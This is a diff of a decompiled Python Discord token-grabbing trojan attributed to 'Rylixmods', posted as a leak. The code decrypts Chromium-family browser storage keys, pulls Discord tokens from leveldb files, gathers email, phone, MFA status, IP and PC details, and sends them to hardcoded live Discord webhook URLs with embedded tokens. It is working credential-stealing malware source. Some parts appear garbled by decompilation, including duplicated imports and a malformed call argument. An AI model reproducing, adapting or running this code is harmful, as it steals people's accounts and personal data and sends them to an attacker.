@@ -1,5 +1,5 @@
 # Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
-# Parts that were not decomplied properly were done by Calloc and by Hand - Warning: Some parts may still be incorrect or inaccurate to what rylix had implemented Still finializing the results...
+# Full Decomp by Calloc
 from requests import post
 from itertools import cycle
 from base64 import b64decode
@@ -33,13 +33,28 @@ from json import loads
 from re import findall
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
-import requests, json, os
+import requests
+import json
+import os
 from datetime import datetime
-
+from discord import File
 tokens = []
 cleaned = []
 checker = []
 
+from base64 import b64decode
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+from os import getlogin, listdir
+from json import loads
+from re import findall
+from urllib.request import Request, urlopen
+from subprocess import Popen, PIPE
+import requests, json, os
+from datetime import datetime
+tokens = []
+cleaned = []
+checker = []
 def decrypt(buff, master_key):
     try:
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
@@ -83,13 +98,13 @@ def get_token():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Iridium': local + '\\Iridium\\User Data\\Default'
-    }  # "CRACKED FINAL VERSION! RYLIX SKIDDED THIS SCRIPT IN SEE: https://github.com/AstraaDev/Discord-Token-Grabber-V2/blob/main/token_grabber.py" - CALLOC 
+    }
     for platform, path in paths.items():
         if not os.path.exists(path): continue
         try:
             with open(path + f"\\Local State", "r") as file:
                 key = loads(file.read())['os_crypt']['encrypted_key']
-                file.close() # NOT RYLIX'S CODE EITHER BUT STILL CONTEXT MANAGER SHOULD've Been Used here instead of closing the file....
+                file.close()
         except: continue
         for file in listdir(path + f"\\Local Storage\\leveldb\\"):
             if not file.endswith(".ldb") and file.endswith(".log"): continue
@@ -136,14 +151,22 @@ def get_token():
                         if has_nitro:
                             d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                             d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            days_left = abs((d2 - d1).days) # TODO (CALLOC) FIX FINAL PARTS THEY ARE DIFFERENT CURRENTLY AND THEN TEST FOR MATCHING PAIRS OF CODE! 
-                            embed = '**{}** *({})*\n\n> :dividers: __Account Information__\n\tEmail: {}\n\tPhone: {}\n\t2FA/MFA Enabled: {}\n\tNitro:{}\n\tExpires in: {} days(s)`\n\n> :computer:__PC Information__\n\tIP: {}\n\tUsername: {}\n\tPC Name:{}\n\tPlatform: {}\n\n> :piData: __Token__\n\t{}\n\n*Made by Rylixmods SFC* **|** ||https://discord.gg/MGTjE73ScD||'\
-                                .format(user_name,user_id,email,phone,mfa_enabled,has_nitro,days_left,ip,pc_username,pc_name,platform,tok)
-                            payload = json.dumps({'content':embed,'username':'Data-Getter - Made by Rylixmods','avatar_url':'https://cdn.discordapp.com/attachments/1111311411415625738/1112732724957040742/IMG_20230518_112316_223.jpg'}) # Payload that gets Sent to Rylix's C2 Webhook...
-                            headers2 = {'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'} # You Could've honestly been more creative here Rylix, like putting headers={<Your data>} instead of all this junk...
-                            req = Request('https://discordapp.com/api/webhooks/1111311441597841428/QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB',data=payload.encode(),headers=headers2)
-                            urlopen(req) # When everyting is done it sends all the discord personal information to Rylix's C2 Server AKA a discord webhook...
-        else: continue
+                            days_left = abs((d2 - d1).days)
+                        embed = f"""**{user_name}** *({user_id})*\n
+> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
+> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
+> :piñata: __Token__\n\t`{tok}`\n
+*Made by Rylixmods SFC* **|** ||https://discord.gg/MGTjE73ScD||"""
+                        payload = json.dumps({'content':embed,'username':'Data-Getter - Made by Rylixmods','avatar_url':'https://cdn.discordapp.com/attachments/1111311411415625738/1112732724957040742/IMG_20230518_112316_223.jpg'})
+                        try:
+                            headers2 = {
+                                'Content-Type': 'application/json',
+                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+                            }
+                            req = Request('https://discordapp.com/api/webhooks/1111311441597841428/QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB', data=payload.encode(), headers=headers2)
+                            urlopen(req) # When Everything is done the trojan sends the data off to his discord channel to be viewed by Rylix himself...
+                        except: continue
+                else: continue
 from discord_webhook import DiscordWebhook
 from discord import Webhook, RequestsWebhookAdapter, File
 webhook_ = Webhook.partial(1112141583815561286, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
